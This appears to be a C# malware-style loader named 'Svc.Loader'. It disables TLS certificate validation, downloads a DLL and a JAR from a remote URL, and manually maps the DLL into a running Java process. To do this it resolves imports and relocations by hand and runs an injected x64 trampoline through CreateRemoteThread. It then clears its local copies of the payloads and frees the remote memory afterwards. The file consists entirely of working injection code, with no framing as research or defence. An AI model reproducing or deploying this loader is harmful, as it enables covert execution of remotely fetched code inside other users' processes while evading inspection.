using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Svc
{
    public class Loader
    {
        const uint PROCESS_ALL_ACCESS = 0x1FFFFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint MEM_RELEASE = 0x8000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PAGE_READWRITE = 0x04;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr, uint size, uint type, uint protect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr, byte[] buf, uint size, out int written);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out int tid);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr handle, uint ms);

        [DllImport("kernel32.dll")]
        static extern bool VirtualFreeEx(IntPtr proc, IntPtr addr, uint size, uint type);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string name);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr module, string name);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary(string name);

        static ushort ReadU16(byte[] b, int o) => BitConverter.ToUInt16(b, o);
        static uint ReadU32(byte[] b, int o) => BitConverter.ToUInt32(b, o);
        static ulong ReadU64(byte[] b, int o) => BitConverter.ToUInt64(b, o);
        static void WriteU64(byte[] b, int o, ulong v) { BitConverter.GetBytes(v).CopyTo(b, o); }

        public static int Run(string baseUrl)
        {
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            string url = baseUrl.TrimEnd(new char[]{'/'});
            byte[] dll, jar;
            try
            {
                using (var wc = new WebClient())
                {
                    dll = wc.DownloadData(url + "/loader.dll");
                    jar = wc.DownloadData(url + "/agent.jar");
                }
            }
            catch { return 1; }

            if (dll.Length < 64 || jar.Length < 4) return 1;
            if (ReadU16(dll, 0) != 0x5A4D) return 1;
            int lfanew = (int)ReadU32(dll, 0x3C);
            if (ReadU32(dll, lfanew) != 0x4550) return 1;

            int pid = FindJava();
            if (pid == 0) return 1;

            IntPtr proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if (proc == IntPtr.Zero) return 1;

            int result = InjectManualMap(proc, dll, jar, lfanew);
            Array.Clear(dll, 0, dll.Length);
            Array.Clear(jar, 0, jar.Length);

            if (result != 0) CloseHandle(proc);
            return result;
        }

        static int InjectManualMap(IntPtr proc, byte[] dll, byte[] jar, int lfanew)
        {
            int optOff = lfanew + 24;
            uint sizeOfImage = ReadU32(dll, optOff + 56);
            uint sizeOfHeaders = ReadU32(dll, optOff + 60);
            ulong preferredBase = ReadU64(dll, optOff + 24);
            uint entryRva = ReadU32(dll, optOff + 16);
            int numSections = ReadU16(dll, lfanew + 6);
            int sectionOff = optOff + ReadU16(dll, lfanew + 20);

            uint impRva = ReadU32(dll, optOff + 120 + 8);
            uint impSize = ReadU32(dll, optOff + 120 + 12);
            uint relRva = ReadU32(dll, optOff + 120 + 40);
            uint relSize = ReadU32(dll, optOff + 120 + 44);

            // allocate DLL image in target
            IntPtr remoteBase = VirtualAllocEx(proc, IntPtr.Zero, sizeOfImage,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteBase == IntPtr.Zero) return 1;

            // allocate jar bytes in target
            IntPtr remoteJar = VirtualAllocEx(proc, IntPtr.Zero, (uint)jar.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (remoteJar == IntPtr.Zero) return 1;
            int w;
            WriteProcessMemory(proc, remoteJar, jar, (uint)jar.Length, out w);

            // allocate context struct in target (marker + jar_addr + jar_size)
            byte[] ctx = new byte[24];
            BitConverter.GetBytes((ulong)0x4D4D).CopyTo(ctx, 0);
            BitConverter.GetBytes((ulong)remoteJar.ToInt64()).CopyTo(ctx, 8);
            BitConverter.GetBytes((ulong)jar.Length).CopyTo(ctx, 16);
            IntPtr remoteCtx = VirtualAllocEx(proc, IntPtr.Zero, (uint)ctx.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            WriteProcessMemory(proc, remoteCtx, ctx, (uint)ctx.Length, out w);

            ulong actualBase = (ulong)remoteBase.ToInt64();
            long delta = (long)(actualBase - preferredBase);

            byte[] image = new byte[sizeOfImage];
            Array.Copy(dll, 0, image, 0, (int)sizeOfHeaders);

            for (int i = 0; i < numSections; i++)
            {
                int sh = sectionOff + i * 40;
                uint virtAddr = ReadU32(dll, sh + 12);
                uint rawSize = ReadU32(dll, sh + 16);
                uint rawPtr = ReadU32(dll, sh + 20);
                if (rawSize > 0 && rawPtr + rawSize <= dll.Length)
                    Array.Copy(dll, (int)rawPtr, image, (int)virtAddr, (int)rawSize);
            }

            // resolve imports
            if (impRva > 0 && impSize > 0)
            {
                int impOff = (int)impRva;
                while (impOff + 20 <= image.Length)
                {
                    uint nameRva = ReadU32(image, impOff + 12);
                    if (nameRva == 0) break;

                    string modName = ReadAscii(image, (int)nameRva);
                    IntPtr mod = GetModuleHandle(modName);
                    if (mod == IntPtr.Zero)
                        mod = LoadLibraryRemote(proc, modName);

                    uint oftRva = ReadU32(image, impOff);
                    uint ftRva = ReadU32(image, impOff + 16);
                    if (oftRva == 0) oftRva = ftRva;

                    int thunk = (int)oftRva;
                    int func = (int)ftRva;

                    while (thunk + 8 <= image.Length)
                    {
                        ulong entry = ReadU64(image, thunk);
                        if (entry == 0) break;

                        IntPtr resolved;
                        if ((entry & 0x8000000000000000UL) != 0)
                        {
                            int ordinal = (int)(entry & 0xFFFF);
                            resolved = GetProcAddress(mod, new string((char)ordinal, 1));
                        }
                        else
                        {
                            int hintNameOff = (int)entry + 2;
                            string funcName = ReadAscii(image, hintNameOff);
                            resolved = GetProcAddress(mod, funcName);
                        }

                        WriteU64(image, func, (ulong)resolved.ToInt64());
                        thunk += 8;
                        func += 8;
                    }

                    impOff += 20;
                }
            }

            // apply relocations
            if (relRva > 0 && relSize > 0 && delta != 0)
            {
                int relOff = (int)relRva;
                while (relOff + 8 <= image.Length)
                {
                    uint blockVa = ReadU32(image, relOff);
                    uint blockSize = ReadU32(image, relOff + 4);
                    if (blockVa == 0 || blockSize == 0) break;

                    int count = (int)(blockSize - 8) / 2;
                    for (int i = 0; i < count; i++)
                    {
                        ushort entry = ReadU16(image, relOff + 8 + i * 2);
                        int type = entry >> 12;
                        int offset = entry & 0xFFF;
                        if (type == 10)
                        {
                            int patchOff = (int)blockVa + offset;
                            if (patchOff + 8 <= image.Length)
                            {
                                ulong val = ReadU64(image, patchOff);
                                WriteU64(image, patchOff, (ulong)((long)val + delta));
                            }
                        }
                    }

                    relOff += (int)blockSize;
                }
            }

            WriteProcessMemory(proc, remoteBase, image, sizeOfImage, out w);
            Array.Clear(image, 0, image.Length);

            // trampoline: DllMain(imageBase, DLL_PROCESS_ATTACH, &ctx)
            IntPtr entryAddr = new IntPtr((long)actualBase + entryRva);
            byte[] trampoline = BuildTrampoline(actualBase, (ulong)entryAddr.ToInt64(),
                (ulong)remoteCtx.ToInt64());

            IntPtr remoteTramp = VirtualAllocEx(proc, IntPtr.Zero, (uint)trampoline.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(proc, remoteTramp, trampoline, (uint)trampoline.Length, out w);

            int tid;
            IntPtr thread = CreateRemoteThread(proc, IntPtr.Zero, 0, remoteTramp, IntPtr.Zero, 0, out tid);
            if (thread != IntPtr.Zero)
            {
                WaitForSingleObject(thread, 10000);
                CloseHandle(thread);
            }

            VirtualFreeEx(proc, remoteTramp, 0, MEM_RELEASE);

            // deferred cleanup: free DLL image, jar bytes, context struct
            System.Threading.ThreadPool.QueueUserWorkItem(_ =>
            {
                System.Threading.Thread.Sleep(15000);
                VirtualFreeEx(proc, remoteJar, 0, MEM_RELEASE);
                VirtualFreeEx(proc, remoteCtx, 0, MEM_RELEASE);
                VirtualFreeEx(proc, remoteBase, 0, MEM_RELEASE);
                CloseHandle(proc);
            });

            return 0;
        }

        static byte[] BuildTrampoline(ulong imageBase, ulong entry, ulong ctxAddr)
        {
            using (var ms = new MemoryStream())
            using (var bw = new BinaryWriter(ms))
            {
                // sub rsp, 0x28
                bw.Write(new byte[] { 0x48, 0x83, 0xEC, 0x28 });
                // mov rcx, imageBase (hinstDLL)
                bw.Write(new byte[] { 0x48, 0xB9 }); bw.Write(imageBase);
                // mov edx, 1 (DLL_PROCESS_ATTACH)
                bw.Write(new byte[] { 0xBA, 0x01, 0x00, 0x00, 0x00 });
                // mov r8, ctxAddr (lpReserved = pointer to InjectionCtx)
                bw.Write(new byte[] { 0x49, 0xB8 }); bw.Write(ctxAddr);
                // mov rax, entry
                bw.Write(new byte[] { 0x48, 0xB8 }); bw.Write(entry);
                // call rax
                bw.Write(new byte[] { 0xFF, 0xD0 });
                // xor eax, eax
                bw.Write(new byte[] { 0x31, 0xC0 });
                // add rsp, 0x28
                bw.Write(new byte[] { 0x48, 0x83, 0xC4, 0x28 });
                // ret
                bw.Write((byte)0xC3);
                return ms.ToArray();
            }
        }

        static IntPtr LoadLibraryRemote(IntPtr proc, string name)
        {
            IntPtr k32 = GetModuleHandle("kernel32.dll");
            IntPtr loadLib = GetProcAddress(k32, "LoadLibraryA");

            byte[] nameBytes = Encoding.ASCII.GetBytes(name + "\0");
            IntPtr remoteName = VirtualAllocEx(proc, IntPtr.Zero, (uint)nameBytes.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            int w;
            WriteProcessMemory(proc, remoteName, nameBytes, (uint)nameBytes.Length, out w);

            int tid;
            IntPtr thread = CreateRemoteThread(proc, IntPtr.Zero, 0, loadLib, remoteName, 0, out tid);
            if (thread != IntPtr.Zero)
            {
                WaitForSingleObject(thread, 5000);
                CloseHandle(thread);
            }

            VirtualFreeEx(proc, remoteName, 0, MEM_RELEASE);
            return LoadLibrary(name);
        }

        static int FindJava()
        {
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    string n = p.ProcessName.ToLower();
                    if (n == "javaw" || n == "java")
                        return p.Id;
                }
                catch { }
            }
            return 0;
        }

        static string ReadAscii(byte[] buf, int off)
        {
            int end = off;
            while (end < buf.Length && buf[end] != 0) end++;
            return Encoding.ASCII.GetString(buf, off, end - off);
        }
    }
}
